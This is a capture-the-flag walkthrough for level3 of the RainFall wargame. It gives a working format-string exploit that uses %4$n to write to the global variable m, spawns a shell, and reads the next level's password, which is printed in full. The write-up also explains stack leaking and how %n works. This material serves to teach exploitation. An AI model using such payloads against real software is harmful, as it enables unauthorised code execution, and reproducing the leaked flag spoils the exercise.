# Walkthrough

## Solution

```
level3@RainFall:~$ (python -c 'print ("\x8c\x98\x04\x08" + "A" * 60 + "%4$n")'; cat) | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
pwd
/home/user/level3
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## Explanation

### Execution

```
level3@RainFall:~$ ./level3 
hello
hello
```
-> The program waits for an input, and then echo that output.  

### Disassembly

```
info var
0x0804988c  m

info function
0x080484a4  v
0x0804851a  main
```

You can view the commented asm code [here](Ressources/assembly.asm)  
You can view the asm code translated to C [here](source.c)  


### Steps

The variable m, located at 0x804988c has to be = to 64 in order to launch the syscall to /bin/sh.  

Direct parameter access allows parameters to be accessed directly by using the dollar sign qualifier.  
For example, %n$d would access the nth parameter and display it as a decimal number.  
This method of direct access eliminates the need to step through memory until the beginning
of the format string is located, since this memory can be accessed directly.  

We use %p or %x to know where our m variable starts in the memory.  
```
level3@RainFall:~$ ./level3 
AAAA %p %p %p %p %p %p %p 
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070
```
-> The 4th one is pointing at our input (AAAA), we need to overwrite the 4th argument (A = 41).  

If we replace the 4th %p by a %n, we will be able to write where the 4th %p is pointing at (i.e. at 0x41414141).  
But this address doesn't exist, so we get a segfault when we do ./level3 AAAA%p%p%p%n.  


%4$n: the 4th element of the stack is a %n, equivalent to writing %x%x%x%n, except the 3 %x won't print.  
%n writes the number of characters there is before the %n, where it is pointing at.  

If we can find the pointer to "AAAA", we can replace AAAA by a specific address to write to.  
We want to write at address 0x804988c, if we do :  
\x8c\x98\x04\x08%4$n, it will write 4 at 0x804988c, as an address is 4 bytes long.  

> -> we therefore need to print 64 characters before the %n to store 64 at 0x804988c,  
in order to pass the cmp and launch the shell.  
`
The beginning of the format string should consist of the target memory address, 60 bytes of junk,
and then 4th parameter printed as %n (=64, target address (4bytes) + 60 * A + %4$n).
`
### Final command

level3@RainFall:~$ (python -c 'print ("\x8c\x98\x04\x08" + "A" * 60 + "%4$n")'; cat) | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
pwd
/home/user/level3
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
